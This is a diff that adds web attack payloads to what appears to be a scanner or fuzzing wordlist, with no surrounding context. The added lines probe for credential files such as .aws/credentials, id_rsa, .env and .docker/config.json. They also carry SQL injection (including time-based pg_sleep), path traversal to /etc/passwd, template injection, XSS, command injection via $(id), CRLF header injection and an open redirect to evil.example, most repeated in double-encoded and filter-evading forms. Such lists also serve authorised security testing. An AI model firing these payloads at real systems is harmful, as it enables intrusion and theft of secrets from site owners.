@@ -78,3 +78,163 @@ HTTP%3A%2F%2F127.0.0.1
 HTTPS%3A%2F%2FEXAMPLE.COM
 ' OR '1'%3D'1
 " OR "1"%3D"1
+%252F.env
+/.env?aurose=1
+/.env&aurose=1
+/.env.bak
+/.env.old
+%252F.git%252Fconfig
+/.git/config?aurose=1
+/.git/config&aurose=1
+/.git/config.bak
+/.git/config.old
+/.aws/credentials
+%2F.aws%2Fcredentials
+%252F.aws%252Fcredentials
+/.AWS/CREDENTIALS
+/.aws/credentials?aurose=1
+/.aws/credentials&aurose=1
+/.aws/credentials.bak
+/.aws/credentials.old
+/config/database.yml
+%2Fconfig%2Fdatabase.yml
+%252Fconfig%252Fdatabase.yml
+/CONFIG/DATABASE.YML
+/config/database.yml?aurose=1
+/config/database.yml&aurose=1
+/config/database.yml.bak
+/config/database.yml.old
+/wp-config.php.bak
+%2Fwp-config.php.bak
+%252Fwp-config.php.bak
+/WP-CONFIG.PHP.BAK
+/wp-config.php.bak?aurose=1
+/wp-config.php.bak&aurose=1
+/wp-config.php.bak.bak
+/wp-config.php.bak.old
+/dump.sql
+%2Fdump.sql
+%252Fdump.sql
+/DUMP.SQL
+/dump.sql?aurose=1
+/dump.sql&aurose=1
+/dump.sql.bak
+/dump.sql.old
+/backup.tar.gz
+%2Fbackup.tar.gz
+%252Fbackup.tar.gz
+/BACKUP.TAR.GZ
+/backup.tar.gz?aurose=1
+/backup.tar.gz&aurose=1
+/backup.tar.gz.bak
+/backup.tar.gz.old
+%252Fid_rsa
+/id_rsa?aurose=1
+/id_rsa&aurose=1
+/id_rsa.bak
+/id_rsa.old
+/.npmrc
+%2F.npmrc
+%252F.npmrc
+/.NPMRC
+/.npmrc?aurose=1
+/.npmrc&aurose=1
+/.npmrc.bak
+/.npmrc.old
+/.docker/config.json
+%2F.docker%2Fconfig.json
+%252F.docker%252Fconfig.json
+/.DOCKER/CONFIG.JSON
+/.docker/config.json?aurose=1
+/.docker/config.json&aurose=1
+/.docker/config.json.bak
+/.docker/config.json.old
+%2527%2520OR%2520%25271%2527%253D%25271
+'/**/OR/**/'1'='1
+' OR '1'%3d'1
+' OR '1'='1?aurose=1
+' OR '1'='1&aurose=1
+%2522%2520OR%2520%25221%2522%253D%25221
+"/**/OR/**/"1"="1
+" OR "1"%3d"1
+" OR "1"="1?aurose=1
+" OR "1"="1&aurose=1
+' AND 1=1 --
+%27%20AND%201%3D1%20--
+%2527%2520AND%25201%253D1%2520--
+'/**/AND/**/1=1/**/--
+' AND 1%3d1 --
+' AND 1=1 --?aurose=1
+' AND 1=1 --&aurose=1
+' AND 1=2 --
+%27%20AND%201%3D2%20--
+%2527%2520AND%25201%253D2%2520--
+'/**/AND/**/1=2/**/--
+' AND 1%3d2 --
+' AND 1=2 --?aurose=1
+' AND 1=2 --&aurose=1
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+../../../../etc/passwd?aurose=1
+../../../../etc/passwd&aurose=1
+..%255C..%255C..%255C..%255Cwindows%255Cwin.ini
+..\..\..\..\windows\win.ini?aurose=1
+..\..\..\..\windows\win.ini&aurose=1
+%2524%257B7%252A7%257D
+${7*7}?aurose=1
+${7*7}&aurose=1
+%257B%257B7%252A7%257D%257D
+{{7*7}}?aurose=1
+{{7*7}}&aurose=1
+<script>alert(document.domain)</script>
+%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+%253Cscript%253Ealert%2528document.domain%2529%253C%252Fscript%253E
+<SCRIPT>ALERT(DOCUMENT.DOMAIN)</SCRIPT>
+<script>alert(document.domain)</script>?aurose=1
+<script>alert(document.domain)</script>&aurose=1
+';SELECT pg_sleep(2)--
+%27%3BSELECT%20pg_sleep%282%29--
+%2527%253BSELECT%2520pg_sleep%25282%2529--
+';SELECT/**/pg_sleep(2)--
+';SELECT PG_SLEEP(2)--
+';SELECT pg_sleep(2)--?aurose=1
+';SELECT pg_sleep(2)--&aurose=1
+%2560id%2560
+`id`?aurose=1
+`id`&aurose=1
+$(id)
+%24%28id%29
+%2524%2528id%2529
+$(ID)
+$(id)?aurose=1
+$(id)&aurose=1
+${IFS}
+%24%7BIFS%7D
+%2524%257BIFS%257D
+${IFS}?aurose=1
+${IFS}&aurose=1
+%0d%0aX-Aurose: 1
+%250d%250aX-Aurose%3A%201
+%25250d%25250aX-Aurose%253A%25201
+%0d%0aX-Aurose:/**/1
+%0D%0AX-AUROSE: 1
+%0d%0aX-Aurose: 1?aurose=1
+%0d%0aX-Aurose: 1&aurose=1
+https://example.com/?next=https://evil.example
+https%3A%2F%2Fexample.com%2F%3Fnext%3Dhttps%3A%2F%2Fevil.example
+https%253A%252F%252Fexample.com%252F%253Fnext%253Dhttps%253A%252F%252Fevil.example
+https://example.com/?next%3dhttps://evil.example
+HTTPS://EXAMPLE.COM/?NEXT=HTTPS://EVIL.EXAMPLE
+https://example.com/?next=https://evil.example?aurose=1
+https://example.com/?next=https://evil.example&aurose=1
+/.env::var0
+%2F.env::v0
+/sensitive/probe/0
+/.git/config::var1
+%2F.git%2Fconfig::v1
+/sensitive/probe/1
+/.aws/credentials::var2
+%2F.aws%2Fcredentials::v2
+/sensitive/probe/2
+/config/database.yml::var3
+%2Fconfig%2Fdatabase.yml::v3
+/sensitive/probe/3
